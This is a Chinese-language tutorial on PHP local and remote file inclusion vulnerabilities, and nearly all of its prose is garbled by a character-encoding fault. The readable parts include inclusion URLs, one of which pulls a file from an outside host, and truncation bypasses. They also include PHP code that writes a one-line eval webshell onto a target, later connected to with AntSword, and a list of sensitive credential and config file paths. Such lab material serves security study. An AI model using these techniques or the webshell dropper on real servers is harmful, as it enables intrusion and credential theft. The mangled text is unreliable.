å¹´å®ƒè¢«çˆ†å‡ºå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æŒ‡å®šçš„payloadå¯¹æœåŠ¡å™¨å†…éƒ¨æ–‡ä»¶è¿›è¡Œè¯»å–çš„æ“ä½œï¼Œè¿™å°±é€ æˆå¾ˆå¤§çš„å±å®³ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯»å–æ•æ„Ÿçš„æ•°æ®ä»è€Œæ§åˆ¶æœåŠ¡å™¨ã€‚ 1.4æ–‡ä»¶åŒ…å«æ¼æ´åˆ†ç±» â€‹ å…¶æ–‡ä»¶åŒ…å«æ¼æ´å…±åˆ†ä¸ºä¸¤å¤§ç±»ï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯å¦‚æœæƒ³è¦å®ç°è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œéœ€è¦php.iniå¼€å¯äº†allow_url_fopenå’Œallow_url_includeçš„é…ç½®ã€‚åŒ…å«çš„æ–‡ä»¶æ˜¯ç¬¬ä¸‰æ–¹æœåŠ¡å™¨çš„æ–‡ä»¶ã€‚æœ¬åœ°æ–‡ä»¶åŒ…å«çš„å«ä¹‰å°±æ˜¯åŒ…å«æœ¬åœ°æœåŠ¡å™¨çš„æ–‡ä»¶ 1.4.1 æœ¬åœ°åŒ…å« åŸç†ï¼š æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLocal File Includeï¼ŒLFIï¼‰ï¼Œèƒ½å¤Ÿè¯»å–æˆ–æ‰§è¡ŒåŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ LFIå…è®¸æ”»å‡»è€…é€šè¿‡æµè§ˆå™¨åŒ…å«æœ¬æœºä¸Šçš„æ–‡ä»¶ã€‚å½“ä¸€ä¸ªWEBåº”ç”¨ç¨‹åºåœ¨æ²¡æœ‰æ­£ç¡®è¿‡æ»¤è¾“å…¥æ•°æ®çš„æƒ…å†µä¸‹ï¼Œå°±æœ‰å¯èƒ½å­˜åœ¨è¿™ä¸ªæ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸æ”»å‡»è€…æ“çºµè¾“å…¥æ•°æ®ã€æ³¨å…¥è·¯å¾„éå†å­—ç¬¦ã€åŒ…å«webæœåŠ¡å™¨çš„å…¶ä»–æ–‡ä»¶ã€‚ æ— é™åˆ¶ï¼šå¯ç›´æ¥åŒ…å«http://127.0.0.1:8888/webinclude.php?filename=phpinfo.txt æœ‰é™åˆ¶ï¼šå³æ¼æ´ä½¿ç”¨æœ‰å¹²æ‰°ï¼Œåˆ™éœ€è¦ç‰¹æ®Šæ–¹æ³•ç»•è¿‡ %00 æˆªæ–­ï¼šæ¡ä»¶ï¼šmagic_quotes_gpc = off phpç‰ˆæœ¬&lt;5.3.4 é•¿åº¦æˆªæ–­ï¼šæ¡ä»¶ï¼šåŒºåˆ†æ“ä½œç³»ç»Ÿï¼šwindowsç‚¹å·éœ€è¦é•¿äº256ï¼›linuxé•¿äº4096 1.4.2 è¿œç¨‹åŒ…å« æ— é™åˆ¶ï¼šç›´æ¥åŒ…å«ï¼šhttp://192.168.114.11/webinclude.php?filename=http://www.xiaodi8.com/readme.txt é™åˆ¶å¼ºåˆ¶æ·»åŠ .html å¯ä»¥ç”¨ä»¥ä¸Šçš„ç¬¦å· ? ã€%23ï¼ˆ#æ³¨é‡Šç¬¦ï¼‰ ã€%20ï¼ˆç©ºæ ¼ï¼‰ï¼ˆä¸å¯ç”¨ï¼‰ æ³¨æ„ï¼š ä¸ºä»€ä¹ˆæ–‡ä»¶åŒ…å«ä¸€èˆ¬ä½¿ç”¨txtæ ¼å¼çš„æ–‡ä»¶ï¼Ÿ 1ã€æ–‡ä»¶åŒ…å«æ˜¯æ— è§†æ–‡ä»¶æ ¼å¼çš„ï¼Œåªè¦æ–‡ä»¶ä¸­å«æœ‰phpä»£ç ï¼Œå®ƒå°±ä¼šæŠŠè¿™ä¸ªæ–‡ä»¶è§£æä¸º1phpè„šæœ¬æ–‡ä»¶ï¼› 2ã€å½“é¶æœºå¯¹æˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨çš„phpè„šæœ¬è¿œç¨‹æ–‡ä»¶åŒ…å«æ—¶ï¼Œç”±äºæˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨å¯ä»¥è§£æphpè„šæœ¬ï¼Œè¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨é¦–å…ˆä¼šå¯¹è¿™ä¸ªphpè„šæœ¬è¿›è¡Œè§£ææ‰§è¡Œï¼Œè¿œç«¯æœåŠ¡å™¨è§£æå®Œæˆåï¼Œç›´æ¥æŠŠè§£æåçš„ç»“æœè¿”å›ç»™é¶æœºæœåŠ¡å™¨ï¼Œç”±äºæ˜¯åœ¨æˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨é‡Œé¢è¿›è¡Œè§£ææ‰§è¡Œçš„ï¼Œæ‰€ä»¥è¿”å›çš„ç»“æœå°±æ˜¯æˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨çš„æ‰§è¡Œç»“æœã€‚ å½“æˆ‘ä»¬ä½¿ç”¨txtæ ¼å¼æˆ–è€…å…¶ä»–éphpæ ¼å¼è¿›è¡Œæ–‡ä»¶åŒ…å«æ—¶ï¼Œç”±äºæˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨æ²¡æœ‰å¯¹æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œä¸ä¼šåœ¨æˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨è¿›è¡Œè§£æï¼›å½“é¶æœºå¯¹æˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨çš„è¿™ä¸ªtxtæ–‡ä»¶è¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«æ—¶ï¼Œé¶æœºå¯¹ txtæ–‡ä»¶è¿›è¡Œè¯»å–æ—¶ï¼Œè¿™å°±ç›¸å½“äºé¶æœºæœåŠ¡å™¨é€šè¿‡è¿œç¨‹æ–‡ä»¶åŒ…å«æŠŠæˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨çš„txtæ–‡ä»¶æ‹¿åˆ°é¶æœºä¸Šé¢äº†ï¼Œé¶æœºå‘ç°é‡Œé¢æœ‰phpä»£ç ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œé¶æœºå°±ä¼šæŒ‰ç…§phpè„šæœ¬å¯¹å®ƒè¿›è¡Œè§£æï¼›ç”±äºæ˜¯åœ¨é¶æœºé‡Œé¢è¯»å–çš„ï¼Œæ‰€ä»¥æ‰§è¡Œçš„ç»“æœå°±æ˜¯é¶æœºçš„ã€‚ è¿œç¨‹æ–‡ä»¶åŒ…å«éœ€è¦åŒ…å«æˆ‘ä»¬æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶æˆ–è€…å…¬ç½‘ä¸Šçš„æ–‡ä»¶ã€‚ 1.4.3 æœ¬åœ°æ–‡ä»¶åŒ…å«ä»£ç æµ‹è¯•-åŸç† æœ¬åœ°å‡†å¤‡ phpinfoçš„txtæ–‡ä»¶ http://127.0.0.1:8888/webinclude.php?filename=phpinfo.txt å¤§å¤šä»£ç è¯­è¨€æ–‡ä»¶åŒ…å«ä¸­å¯æ·»åŠ è·¯å¾„ä»¥è¯»å–å…¶ä»–è·¯å¾„ä¸‹æ–‡ä»¶ï¼š`../../`ï¼Œ`d:\\`ç­‰ æœ‰é™åˆ¶æ—¶ï¼šä»¥æ·»åŠ  .htmlåç¼€ä¸ºä¾‹ 1.4.4 è¿œç¨‹æ–‡ä»¶åŒ…å«ä»£ç æµ‹è¯•-åŸç† å¯¹äºè¿œç¨‹åŒ…å«ï¼Œè‹¥phpç¯å¢ƒç¦æ­¢ï¼Œå³æ²¡æœ‰è¿œç¨‹åŒ…å«åŠŸèƒ½ æ— é™åˆ¶æ—¶ç›´æ¥åŒ…å«ï¼š(å¯ä»¥ä½¿ç”¨?å’Œ#è¿›è¡Œä¼ªæˆªæ–­ï¼Œè¯¥æ–¹æ³•å¯¹PHPç‰ˆæœ¬æ²¡è¦æ±‚ï¼Œä½†æ˜¯è¦æ±‚èƒ½å¤ŸåŒ…å«è¿œç¨‹æ–‡ä»¶ã€‚) ä»¥æ·»åŠ  .htmlåç¼€ä¸ºä¾‹çš„é™åˆ¶çº§ï¼š 1.4.5 è¿œç¨‹æ–‡ä»¶åŒ…å«ä»£ç æµ‹è¯•-åŸç† 1ã€æŸ¥çœ‹è¿œç«¯æœåŠ¡å™¨çš„ipå’Œphpinfo();ä¿¡æ¯: ipï¼š185.243.241.45 phpinfo()ä¿¡æ¯:phpç‰ˆæœ¬ä¸º5.6.40 2ã€æŸ¥çœ‹é¶æœºçš„ipå’Œphpinfo();ä¿¡æ¯: ipï¼š127.0.0.1 phpinfo()ä¿¡æ¯:phpç‰ˆæœ¬ä¸º7.3.4 3ã€åœ¨è¿œç«¯æœåŠ¡å™¨ç½‘ç«™ä¸»ç›®å½•ä¸‹ï¼Œåˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯1.phpï¼Œä¸€ä¸ªæ˜¯1.txt: å†…å®¹: &lt;?php phpinfo();?&gt; 4ã€åœ¨é¶æœºä¸Šé¢å¯¹è¿œç«¯æœåŠ¡å™¨çš„1.phpæ–‡ä»¶è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥çœ‹å‡ºï¼Œè§£æçš„ç»“æœä¸ºè¿œç«¯æœåŠ¡å™¨çš„phpinfo();ä¿¡æ¯ï¼Œå¦‚æœä½¿ç”¨ä¸€å¥è¯æœ¨é©¬çš„è¯ï¼Œè·å¾—çš„webshellä¹Ÿæ˜¯è‡ªå·±çš„è¿œç«¯æœåŠ¡å™¨çš„ï¼š æ³¨:è¿™é‡Œä¹‹æ‰€ä»¥è¿”å›çš„æ˜¯æˆ‘ä»¬çš„è¿œç«¯æœåŠ¡å™¨çš„phpinfo();ä¿¡æ¯ï¼Œæ˜¯å› ä¸ºphpinfo();è„šæœ¬åœ¨æˆ‘ä»¬çš„è¿œç«¯æœåŠ¡å™¨ä¸Šé¢è¢«æ‰§è¡Œäº†ï¼Œæ‰§è¡Œå®Œæˆåï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«è¿”å›äº†è¿œç«¯æœåŠ¡å™¨çš„æ‰§è¡Œç»“æœã€‚ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ‰§è¡Œç»“æœä¸æ˜¯é¶æœºç½‘ç«™çš„è€Œæ˜¯æˆ‘ä»¬è‡ªå·±çš„è¿œç«¯æœåŠ¡å™¨çš„æ‰§è¡Œç»“æœã€‚ 5ã€åœ¨é¶æœºä¸Šé¢è¿œç¨‹åŒ…å«æˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨ç½‘ç«™ä¸»ç›®å½•ä¸‹çš„1.txtæ–‡ä»¶ï¼Œå¯ä»¥çœ‹å‡ºï¼Œå¯ä»¥çœ‹å‡ºè§£æçš„ç»“æœä¸ºé¶æœºçš„phpinfo();ä¿¡æ¯ï¼š æ³¨:å½“æˆ‘ä»¬ä½¿ç”¨txtæ ¼å¼æˆ–è€…å…¶ä»–éphpæ ¼å¼è¿›è¡Œæ–‡ä»¶åŒ…å«æ—¶ï¼Œç”±äºæˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨æ²¡æœ‰å¯¹æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œä¸ä¼šåœ¨æˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨è¿›è¡Œè§£æï¼›æ‰€ä»¥å½“é¶æœºå¯¹æˆ‘ä»¬è¿œç«¯æœåŠ¡å™¨çš„è¿™ä¸ª1.txtæ–‡ä»¶è¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«æ—¶ï¼Œè¿œç«¯æœåŠ¡å™¨ä¸å¯¹å®ƒåšè§£æï¼Œé¶æœºå¯¹1.txtè¿›è¡Œè¯»å–æ—¶ï¼Œå‘ç°é‡Œé¢æœ‰phpä»£ç ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œé¶æœºå°±ä¼šæŒ‰ç…§phpè„šæœ¬å¯¹å®ƒè¿›è¡Œè§£æï¼›ç”±äºæ˜¯åœ¨é¶æœºé‡Œé¢è¯»å–çš„ï¼Œæ‰€ä»¥æ‰§è¡Œçš„ç»“æœå°±æ˜¯é¶æœºçš„ã€‚ 1.4.6 åŒ…å«å¤§é©¬æ–‡ä»¶ï¼š 1ã€å¤åˆ¶ä¸€ä¸ªå¤§é©¬æ–‡ä»¶dama.phpåˆ°ä¸»æœºçš„ç½‘ç«™ä¸»ç›®å½•ä¸‹ï¼Œå¹¶ä¿®æ”¹åç¼€åä¸ºtxtæ ¼å¼ï¼š 2ã€ç›´æ¥è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°æœåŠ¡å™¨æ˜¯ä»¥æ–‡æœ¬æ–‡ä»¶çš„æ–¹å¼æ‰“å¼€ï¼š 3ã€å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œå‘ç°dama.txtæ ¼å¼çš„æ–‡ä»¶è¢«ä»¥phpè„šæœ¬çš„å½¢å¼è§£æäº†ï¼š è¿™é‡Œä¸çŸ¥é“ä¸ºå•¥æˆ‘æ˜¾ç¤ºçš„é¡µé¢ä¸å¯¹åŠ²ï¼Œä¸‹é¢å±•ç¤ºä¸€ä¸ªæ­£å¸¸çš„ 1.4.6 å†™å…¥æ–‡ä»¶è„šæœ¬æ–¹å¼ï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬ 1ã€åœ¨è™šæ‹Ÿæœºç½‘ç«™ä¸»ç›®å½•ä¸‹é¢åˆ›å»ºä¸€ä¸ª3.txtçš„æ–‡ä»¶,é€šè¿‡è¿™ä¸ªæ–‡ä»¶å‘æœåŠ¡å™¨é‡Œé¢å†™å…¥ä¸€å¥è¯æœ¨é©¬yih.phpæ–‡ä»¶ï¼š å†…å®¹ï¼š &lt;?php $file=fopen('yjh.php','w'); fputs($file,'&lt;?php @eval($_REQUEST[666]);?&gt;'); ?&gt; 3ã€ä½¿ç”¨è¿œç¨‹æ–‡ä»¶è¿›è¡ŒåŒ…å«è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶æŸ¥çœ‹æ–‡ä»¶åŒ…å«ç›®å½•ä¸‹ï¼Œå·²ç»åˆ›å»ºäº†ä¸€ä¸ªyjh.phpçš„æ–‡ä»¶ï¼š 4ã€ä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥ï¼ŒæˆåŠŸè·å¾—webshellï¼ˆè¿™é‡Œæ³¨æ„æ·»åŠ yjh.phpçš„è·¯å¾„æ³•ï¼‰ æ³¨æ„: æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡ä¼ å…¥å‚æ•°è¿›è¡Œè®¿é—®phpinfoé¡µé¢ï¼Œå¯èƒ½æ˜¯DVWAçš„ç¯å¢ƒé—®é¢˜ï¼›è¿˜æœ‰å°±ç®—æˆ‘ä»¬èƒ½å¤Ÿè¿æ¥åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯èœåˆ€è¿æ¥ä¸ä¸Šï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå†™å…¥æ–‡ä»¶çš„è„šæœ¬æ–‡ä»¶ï¼Œé€šè¿‡è®¿é—®è¿™ä¸ªè„šæœ¬æ–‡ä»¶ï¼Œåœ¨ç›®æ ‡æœåŠ¡å™¨é‡Œé¢åˆ›å»ºä¸€ä¸ªä¸€å¥è¯æœ¨é©¬çš„æ–¹å¼è¿›è¡Œè¿æ¥ã€‚ 1.5æ¼æ´çš„æ”»å‡»æ­¥éª¤ æˆ‘ä»¬å°†ä»phpè¯­è¨€çš„è§’åº¦æ¥çœ‹ä¸€ä¸‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä»¥åŠç›¸å…³çš„æ”»å‡»æ­¥éª¤ åœ¨phpè¯­è¨€å½“ä¸­ï¼Œæœ‰å››ç§æ–‡ä»¶åŒ…å«çš„å‡½æ•°ï¼Œåˆ†åˆ«æ˜¯includeã€requireã€include_onceã€require_once Includeï¼šè¢«åŒ…å«æ–‡ä»¶å…ˆæŒ‰å‚æ•°ç»™å‡ºçš„è·¯å¾„å¯»æ‰¾ï¼Œå¦‚æœæ²¡æœ‰ç»™å‡ºç›®å½•ï¼ˆåªæœ‰æ–‡ä»¶åï¼‰æ—¶åˆ™æŒ‰ç…§ include_pathæŒ‡å®šçš„ç›®å½•å¯»æ‰¾ã€‚å¦‚æœåœ¨ include_pathä¸‹æ²¡æ‰¾åˆ°è¯¥æ–‡ä»¶åˆ™ include æœ€åæ‰åœ¨è°ƒç”¨è„šæœ¬æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å’Œå½“å‰å·¥ä½œç›®å½•ä¸‹å¯»æ‰¾ã€‚å¦‚æœæœ€åä»æœªæ‰¾åˆ°æ–‡ä»¶åˆ™ include ç»“æ„ä¼šå‘å‡ºä¸€æ¡è­¦å‘Šï¼› psï¼šphpå¼€å¯é”™è¯¯é¢˜å‹éœ€è¦é…ç½®php.iniä¸­disaply_errorsä¸ºOn Requireï¼šrequire å’Œ includeå‡ ä¹å®Œå…¨ä¸€æ ·ï¼Œé™¤äº†å¤„ç†å¤±è´¥çš„æ–¹å¼ä¸åŒä¹‹å¤–ã€‚require åœ¨å‡ºé”™æ—¶äº§ç”Ÿ E_COMPILE_ERROR çº§åˆ«çš„é”™è¯¯ã€‚æ¢å¥è¯è¯´å°†å¯¼è‡´è„šæœ¬ä¸­æ­¢è€Œ includeåªäº§ç”Ÿè­¦å‘Šï¼ˆE_WARNINGï¼‰ï¼Œè„šæœ¬ä¼šç»§ç»­è¿è¡Œã€‚ Include_onceï¼šinclude_once è¯­å¥åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚æ­¤è¡Œä¸ºå’Œ includeè¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­å·²ç»è¢«åŒ…å«è¿‡ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ï¼Œä¸” include_once ä¼šè¿”å› trueã€‚ å¦‚åŒæ­¤è¯­å¥åå­—æš—ç¤ºçš„é‚£æ ·ï¼Œè¯¥æ–‡ä»¶åªä¼šåŒ…å«ä¸€æ¬¡ã€‚ include_once å¯ä»¥ç”¨äºåœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒä¸€ä¸ªæ–‡ä»¶æœ‰å¯èƒ½è¢«åŒ…å«è¶…è¿‡ä¸€æ¬¡çš„æƒ…å†µä¸‹ï¼Œæƒ³ç¡®ä¿å®ƒåªè¢«åŒ…å«ä¸€æ¬¡ä»¥é¿å…å‡½æ•°é‡å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜ã€‚ Require_onceï¼šrequire_once è¯­å¥å’Œ requireè¯­å¥å®Œå…¨ç›¸åŒï¼Œå”¯ä¸€åŒºåˆ«æ˜¯ PHP ä¼šæ£€æŸ¥è¯¥æ–‡ä»¶æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚æœæ˜¯åˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚ æˆ‘ä»¬æ¥æ€»ç»“ä¸‹ï¼Œincludeå‡½æ•°åœ¨æ‰§è¡Œæ–‡ä»¶æ—¶å€™æ¯æ¬¡éƒ½è¦è¿›è¡Œè¯»å–å’Œè¯„ä¼°ï¼Œåœ¨æ‰¾ä¸åˆ°æ–‡ä»¶çš„æƒ…å†µä¸‹ä¼šå‘å‡ºä¸€æ¡è­¦å‘Šï¼Œä¸”è¿˜ä¼šç»§ç»­è¿è¡Œï¼Œrequireåˆ™ä¼šç»™å‡ºä¸€æ¡è‡´å‘½é”™è¯¯ï¼Œä»è€Œåœæ­¢è¿è¡Œï¼Œinclude_onceå’Œrequire_onceå’Œincludeå’Œrequireç±»ä¼¼ï¼Œä½†ä»–ä»¬ä»…ä»…åªåŒ…å«ä¸€æ¬¡ã€‚ 1.5.1 åˆ¤æ–­æœåŠ¡å™¨ç±»å‹ â€‹ å…¶å®åˆ¤æ–­æœåŠ¡å™¨ç±»å‹è¿˜æ˜¯å¾ˆå¥½åˆ¤æ–­çš„, åœ¨linuxç³»ç»Ÿå½“å­˜åœ¨1.phpçš„æ—¶å€™è¯»å–å°±æ˜¯cat 1.phpï¼Œè€Œä¸”è¯»å–çš„å†…å®¹å‡å¦‚æ˜¯ï¼šâ€œI Love Youâ€ï¼Œè‹¥æ˜¯è¯»å–1.Phpé‚£ä¹ˆè¿˜èƒ½å¤Ÿæ˜¾ç¤º\"I Love You\"å—ï¼Ÿç»“æœè‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œç”±äºåœ¨linuxä¸­æ˜¯ä¸¥æ ¼åŒºåˆ†å¤§å°å†™çš„ã€‚è€Œåœ¨windowsä¸­æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œè¿™é‡Œå°±å¯ä»¥ä½¿ç”¨windowsè¿›è¡Œæµ‹è¯•ã€‚ é€šè¿‡ä¸Šé¢çš„å›¾ç‰‡èƒ½å¤Ÿçœ‹å‡ºæ¥ï¼Œæˆ‘åœ¨URLä¸­è¯»å–çš„æ˜¯1.phPï¼Œä½†æ–‡ä»¶å¤¹ä¸­åªæœ‰1.phpï¼Œä½†ä¾æ—§æ˜¾ç¤ºPHPçš„é»˜è®¤æ–‡ä»¶ã€‚è¿™å°±éªŒè¯äº†æˆ‘ä¸Šé¢æåˆ°çš„Windowsæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚ 1.5.2 æ•æ„Ÿæ–‡ä»¶è¯»å– æ‰€è°“è¯»å–æ•æ„Ÿæ–‡ä»¶ï¼Œå°±æ˜¯å°†WEBæœåŠ¡å™¨ä¸Šä¸€äº›å…¶ä»–æ–‡ä»¶è¯»å–å‡ºæ¥ï¼Œè¿™äº›å…¶ä»–æ–‡ä»¶ä¸­å¯èƒ½åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œç§å¯†æ–‡ä»¶æˆ–è€…æ˜¯ä¸€äº›æ•°æ®ã€è¡¨æ ¼ç­‰ã€‚ 1.5.3 ç»å¯¹è·¯å¾„è¯»å– ç»å¯¹è·¯å¾„æ˜¯æŒ‡ç›®å½•ä¸‹çš„ç»å¯¹ä½ç½®ï¼Œç›´æ¥åˆ°è¾¾ç›®æ ‡ä½ç½®ï¼Œé€šå¸¸æ˜¯ä»ç›˜ç¬¦å¼€å§‹çš„è·¯å¾„ï¼Œç»å¯¹è·¯å¾„è¯»å–å°±æ˜¯é€šè¿‡æ˜ç¡®çš„è·¯å¾„è¿›è¡Œè¯»å–æ–‡ä»¶ï¼Œæ¯”å¦‚windowsæˆ–è€…linxuä¸­çš„ä¸€äº›æ—¥å¿—æ–‡ä»¶å­˜åœ¨çš„è·¯å¾„ï¼Œæˆ–è€…ä¸€äº›é…ç½®æ–‡ä»¶å­˜æ”¾çš„è·¯å¾„ã€‚ windowsæ•æ„Ÿæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ C:\\boot.ini #æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ C:\\windows\\system32\\inetsrv\\MetaBase.xml #IISé…ç½®æ–‡ä»¶ C:\\windows\\repair\\sam #å­˜å‚¨Windowsçš„å¯†ç  C:\\programFiles\\mysql\\my.ini #mysqlé…ç½®æ–‡ä»¶ï¼Œé‡Œé¢å¯èƒ½æœ‰å¯†ç  C:\\programFiles\\mysql\\data\\mysql\\user.MYD #mysql rootå¯†ç  C:\\windows\\php.ini #phpé…ç½®æ–‡ä»¶ linuxæ•æ„Ÿæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ /etc/passwd #ç”¨æˆ·å¯†ç  /usr/local/app/apache2/conf/httpd.conf #apache2é»˜è®¤é…ç½®æ–‡ä»¶ /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #è™šæ‹Ÿç½‘ç«™è®¾ç½® /usr/local/app/php5/lib/php.ini #phpç›¸å…³è®¾ç½® /etc/httpd/conf/httpd.conf #apacheé…ç½®æ–‡ä»¶ /etc/my.cnf #mysqlé…ç½®æ–‡ä»¶ /etc/sysconfig/iptables #æŸ¥çœ‹é˜²ç«å¢™ç­–ç•¥ ç»å¯¹è·¯å¾„è¯»å–æ¡ˆä¾‹ é€šè¿‡URLçœ‹åˆ°æˆ‘è¿™é‡Œæ˜¯ç›´æ¥è¯»å–æˆ‘C:\\tool\\PHPTutorial\\1.txtçš„æ–‡ä»¶ã€‚ 1.5.4 ç›¸å¯¹è·¯å¾„è¯»å– ç›¸å¯¹è·¯å¾„å°±æ˜¯æŒ‡ç”±è¿™ä¸ªæ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„å¼•èµ·çš„è·Ÿå…¶å®ƒæ–‡ä»¶ï¼ˆæˆ–æ–‡ä»¶å¤¹ï¼‰çš„è·¯å¾„å…³ç³»ã€‚ç›¸å¯¹è·¯å¾„è¯»å–å°±æ˜¯å½“æˆ‘ä»¬ä¸çŸ¥é“æŸä¸ªæ–‡ä»¶å…·ä½“è·¯å¾„çš„æ—¶å€™ï¼Œä½¿ç”¨ç›¸å¯¹è·¯å¾„ä»¥å½“å‰ä½ç½®ä½œä¸ºå‚çœ‹å‘åé€€ï¼Œé€æ¬¡è®¿é—®ã€‚ ç›¸å¯¹è·¯å¾„è¯»å–æ–¹å¼ ç›¸å¯¹åˆ©ç”¨è¯»å–æ–¹å¼å°±éœ€è¦ä½¿ç”¨\"â€¦/â€œæ¥è¿›è¡Œè¯»å–ï¼Œä¸€æ¬¡â€../â€œå‘åé€€ä¸€æ¬¡ã€‚ ä¾‹å¦‚ï¼šå½“æˆ‘ä»¬åœ¨C:\\tool\\PHPTutorial\\wwwçš„æ—¶å€™ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨â€â€¦/â€œçš„æ—¶å€™æˆ‘ä»¬å°±é€€åˆ°C:\\tool\\PHPTutorialï¼Œè‹¥ä½¿ç”¨ä¸¤æ¬¡â€â€¦/â€œçš„æ—¶å€™å°±ä¼šé€€åˆ°C:\\toolï¼Œä¸¤æ¬¡â€../â€œä¹Ÿå°±æ˜¯â€../../\"å°±å¯ä»¥äº†ã€‚ eg__1: è¿™é‡Œæˆ‘æŠŠ1.txtåˆ›å»ºåœ¨C:\\tool\\PHPTutorialç›®å½•ä¸‹ï¼Œè€Œç°åœ¨è¿™ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´æ”¾åœ¨wwwä¸‹ä¹Ÿå°±æ˜¯C:\\tool\\PHPTutorial\\wwwï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘åªéœ€è¦è¾“å…¥ä¸€æ¬¡\"â€¦/\"å°±å¯ä»¥è¯»å–åˆ°1.txtäº†ã€‚ eg__2: è¿™é‡Œæˆ‘ä»¬æ€è€ƒä¸€ä¸‹è‹¥æˆ‘ä»¬è¦è®¿é—®C:\\windows\\win.iniï¼Œè¯¥æ€ä¹ˆè¯»å–å‘¢ï¼Ÿå…¶å®è¿™é‡Œå¯ä»¥å…ˆé€€åˆ°æ ¹ç›®å½•ä¸‹ä¹Ÿå°±æ˜¯Cç›˜ä¸‹ï¼Œç„¶ååœ¨è®¿é—®windowsä¸­çš„win.iniã€‚ ç›®å‰æˆ‘ä»¬åœ¨C:\\tool\\PHPTutorial\\wwwä¸‹é¢ï¼Œé‚£ä¹ˆå¯ä»¥ç®—ä¸€ä¸‹æˆ‘ä»¬è¦é€€å‡ æ¬¡ï¼Ÿè¿™é‡Œé€šè¿‡ç›®å½•ä¹Ÿèƒ½å¤Ÿçœ‹å‡ºæ¥ï¼Œè¿™é‡Œåªéœ€è¦é€€ä¸‰æ¬¡å°±å¯ä»¥åˆ°Cç›˜ä¸‹äº†ã€‚ è¿™é‡Œç”±äºæ— æ³•åœ¨Cç›˜ä¸­åˆ›å»ºæ–‡ä»¶ï¼Œå°±æ— æ³•æ¼”ç¤ºäº†ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬ç›´æ¥è¯»å–C:\\windows\\win.iniå§ã€‚ eg__3: è¿™é‡Œåˆå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œè‹¥æˆ‘ä»¬å¹¶ä¸çŸ¥é“æˆ‘ä»¬å­˜åœ¨é‚£ä¸ªç›®å½•ä¸‹ï¼Œæ›´ä¸çŸ¥é“è¯¥é€€å‡ çº§æ€ä¹ˆåŠï¼Ÿå…¶å®è¿™é‡Œé€šè¿‡\"â€¦/â€œé€€å¯ä»¥å¤šé€€å‡ æ¬¡ï¼Œå› ä¸ºæœ€ç»ˆåªèƒ½å¤Ÿé€€åˆ°Cç›˜ï¼Œæ‰€ä»¥åœ¨ä¸çŸ¥é“å‡ çº§çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å¤šè¾“å…¥å‡ 